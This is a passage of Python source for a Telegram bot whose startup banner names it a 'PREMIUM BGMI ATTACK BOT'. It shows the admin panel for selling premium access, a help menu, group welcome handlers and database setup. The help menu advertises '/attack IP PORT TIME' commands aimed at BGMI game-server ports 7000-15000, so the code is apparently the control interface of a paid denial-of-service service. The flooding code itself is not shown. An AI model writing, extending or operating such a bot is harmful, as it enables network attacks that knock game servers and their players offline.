        size = sum(os.path.getsize(v["path"]) for v in videos if os.path.exists(v["path"]))
        await callback_query.answer(
            f"📹 {len(videos)} videos\n💾 {size/(1024*1024):.1f} MB",
            show_alert=True
        )
    
    # ─── Admin Panel ───
    elif data == "admin_panel":
        if uid != OWNER_ID:
            await callback_query.answer("Owner only!", show_alert=True)
            return
        
        await callback_query.message.edit_text(
            f"👑 **ADMIN PANEL** 👑\n\n"
            f"{LINE}\n"
            f"💎 `/addpremium ID`\n"
            f"❌ `/removepremium ID`\n"
            f"✅ `/adduser ID`\n"
            f"📋 `/premiumlist`\n"
            f"📊 `/stats`\n"
            f"{LINE}",
            reply_markup=get_admin_keyboard()
        )
    
    elif data == "premium_list":
        if uid != OWNER_ID:
            await callback_query.answer("Owner only!", show_alert=True)
            return
        users = get_premium_list()
        text = f"💎 **PREMIUM** ({len(users)})\n\n" + "\n".join([f"• `{u}`" for u in users]) if users else "No users!"
        await callback_query.message.edit_text(text, reply_markup=get_back_button())
    
    elif data == "bot_stats":
        await stats_cmd(client, callback_query.message)
    
    # ─── Help ───
    elif data == "help":
        await callback_query.message.edit_text(
            f"ℹ️ **HELP MENU** ℹ️\n\n"
            f"{LINE}\n"
            f"⚔️ `/attack IP PORT TIME` - Start attack\n"
            f"🛑 `/stop` - Stop attack\n"
            f"📊 `/status` - Check status\n"
            f"📹 `/addvideo` - Add video (reply)\n"
            f"📋 `/videos` - List videos\n"
            f"🗑️ `/delvideo ID` - Delete\n"
            f"🧹 `/clearvideos` - Clear all\n"
            f"{LINE}\n"
            f"👑 **Admin:**\n"
            f"💎 `/addpremium ID`\n"
            f"❌ `/removepremium ID`\n"
            f"✅ `/adduser ID`\n"
            f"📊 `/stats`\n"
            f"{LINE}\n"
            f"🎮 **BGMI Ports:** 7000-15000\n"
            f"{LINE}",
            reply_markup=get_back_button()
        )

# ═══════════════ GROUP SERVICE HANDLERS ═══════════════

@app.on_message(filters.group & filters.service)
async def service_handler(client, message: Message):
    """Handle join/leave messages with random videos"""
    try:
        chat_id = message.chat.id
        
        if not is_group_enabled(chat_id):
            return
        
        if message.new_chat_members:
            for user in message.new_chat_members:
                if user.is_bot:
                    continue
                
                mention = f"[{user.first_name}](tg://user?id={user.id})"
                time_str = get_current_time()
                date_str = get_current_date()
                
                texts = [
                    f"🔥 **{mention}** Joined!\n\nWelcome to the group! 🎉",
                    f"👑 **{mention}** Arrived!\n\nMake some noise! 🎊",
                    f"💪 **{mention}** is here!\n\nLet's go! 🚀",
                ]
                
                vid = get_random_video()
                text = f"{random.choice(texts)}\n\n{LINE}\n🕐 {time_str} • 📅 {date_str}"
                
                if vid and os.path.exists(vid["path"]):
                    await app.send_video(chat_id, vid["path"], caption=text)
                else:
                    await app.send_message(chat_id, text)
        
        elif message.left_chat_member:
            user = message.left_chat_member
            if user.is_bot:
                return
            
            mention = f"[{user.first_name}](tg://user?id={user.id})"
            time_str = get_current_time()
            date_str = get_current_date()
            
            text = f"👋 **{mention}** Left!\n\nGoodbye! 😢\n\n{LINE}\n🕐 {time_str} • 📅 {date_str}"
            await app.send_message(chat_id, text)
    
    except Exception as e:
        logger.error(f"Service handler error: {e}")

# ═══════════════ GROUP COMMANDS ═══════════════

@app.on_message(filters.group & filters.command("addgroup"))
async def add_group_cmd(client, message: Message):
    try:
        chat_id = message.chat.id
        chat_name = message.chat.title or f"Group {chat_id}"
        
        await message.delete()
        
        save_group(chat_id, chat_name)
        
        text = f"""
✅ **GROUP ADDED!**

{LINE}
📛 **Name:** {chat_name}
🆔 **ID:** `{chat_id}`
📅 **Date:** {get_current_date()}
🕐 **Time:** {get_current_time()}
{LINE}

🌟 **STATUS:** ✅ ACTIVE
"""
        sent = await message.reply_text(text)
        await asyncio.sleep(5)
        await sent.delete()
        
    except Exception as e:
        logger.error(f"Add group error: {e}")

@app.on_message(filters.command("groups") & filters.private)
async def groups_list_cmd(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    groups = get_all_groups()
    
    if not groups:
        return await message.reply_text("👥 **No groups!**")
    
    text = f"👥 **MY GROUPS** ({len(groups)})\n\n{LINE}\n"
    for gid, data in groups.items():
        status = "✅" if data.get("enabled", True) else "❌"
        text += f"{status} **{data['name']}**\n🆔 `{gid}`\n\n"
    text += f"{LINE}"
    
    await message.reply_text(text)

# ═══════════════ INIT DATABASE ═══════════════

for db_file in [VIDEO_DB, GROUPS_DB, MUTE_DB, USERS_DB]:
    if not os.path.exists(db_file):
        default = [] if db_file == VIDEO_DB else {}
        save_json(db_file, default)

os.makedirs("downloads", exist_ok=True)

# ═══════════════ START BOT ═══════════════

print(f"""
╔══════════════════════════════════════╗
║  💎 PREMIUM BGMI ATTACK BOT 💎      ║
║  Video System | Attack | Premium    ║
╚══════════════════════════════════════╝
""")

print(f"📹 Videos: {get_video_count()}")
print(f"💎 Premium System: Active")
print(f"💀 Attack System: Ready")
print(f"👥 Group System: Active")
print(f"\n🤖 BOT IS RUNNING!\n")

if __name__ == "__main__":
    app.run()
